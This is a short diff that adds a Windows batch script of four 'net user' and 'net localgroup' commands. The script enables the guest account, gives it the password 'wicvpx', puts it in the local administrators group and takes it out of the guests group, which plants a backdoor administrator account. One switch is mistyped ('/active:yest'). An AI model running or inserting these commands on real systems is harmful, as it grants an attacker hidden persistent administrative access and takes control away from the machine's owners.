@@ -1,0 +1,4 @@
+net user guest /active:yest
+net user guest wicvpx
+net localgroup administrators guest /add
+net localgroup guests guest /del
